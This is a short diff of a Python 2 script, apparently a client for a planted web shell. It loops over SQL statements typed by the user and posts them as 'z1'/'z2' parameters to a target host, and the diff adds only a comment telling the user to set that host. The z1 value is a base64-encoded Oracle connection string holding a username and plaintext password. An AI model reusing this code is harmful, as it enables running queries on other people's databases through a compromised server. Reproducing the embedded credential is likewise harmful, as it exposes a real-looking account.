@@ -19,6 +19,7 @@ while sql_str<>'exit':
 		     'z1':'UHJvdmlkZXI9T3JhT0xFREIuT3JhY2xlO0RhdGEgU291cmNlPXR0ZGJfNjE7VXNlciBJZD10dG1pcztQYXNzd29yZD13c2hzeXNoZXdsZXR0emdkO1BlcnNpc3QgU2VjdXJpdHkgSW5mbz1UcnVlOw==',
 		     'z2':encode_sql}
 	test_data_urlencode = urllib.urlencode(test_data)
+	#update by yourself
 	ttdb = base64.b64decode('yourencodeip')
 	headerdata = {"Content-type": "application/x-www-form-urlencoded"}
 	conn = httplib.HTTPConnection(ttdb)	
